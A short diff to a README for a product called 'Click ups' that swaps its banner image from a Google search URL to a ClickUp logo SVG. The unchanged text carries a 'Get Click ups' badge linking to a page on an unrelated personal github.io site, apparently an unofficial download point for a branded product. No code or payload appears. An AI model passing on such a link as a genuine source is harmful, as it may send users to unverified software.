@@ -2,7 +2,7 @@
 
 > **Click ups keeps your tasks organized without slowing you down. You want Click ups because it does one thing well.**
 
-![Banner Placeholder](https://www.google.com/search?q=ClickUp+LOGO&sca_esv=1224a207121717d4&udm=2&biw=1062&bih=804&ei=3TTSac3qBsf_7M8P1-bEmAk&ved=0ahUKEwiNzYv5u9aTAxXHP_sDHVczEZMQ4dUDCBI&uact=5&oq=ClickUp+LOGO&gs_lp=Egtnd3Mtd2l6LWltZyIMQ2xpY2tVcCBMT0dPMgYQABgHGB4yBhAAGAcYHjIGEAAYBxgeMgYQABgHGB4yBhAAGAcYHjIGEAAYBxgeMgYQABgHGB4yBRAAGIAEMgQQABgeMgQQABgeSO4CUABYAHAAeACQAQCYAS6gAS6qAQExuAEDyAEA-AEC-AEBmAIBoAI-mAMAkgcBMaAHxwSyBwExuAc-wgcDMy0xyAcMgAgB&sclient=gws-wiz-img#sv=CAMSVhoyKhBlLVR2WVZCRVlFVFNkUjBNMg5UdllWQkVZRVRTZFIwTToONmJTRXFYcmRnWkNYVU0gBCocCgZtb3NhaWMSEGUtVHZZVkJFWUVUU2RSME0YADABGAcg-PusoQJKCBABGAEgASgB)
+![Banner Placeholder](https://cdn.worldvectorlogo.com/logos/clickup.svg)
 
 [![Get Click ups](https://img.shields.io/badge/Get_Click_ups-Now-0a5d8d?style=for-the-badge&logo=github)](https://imelamauba.github.io/.github/click-ups)
 
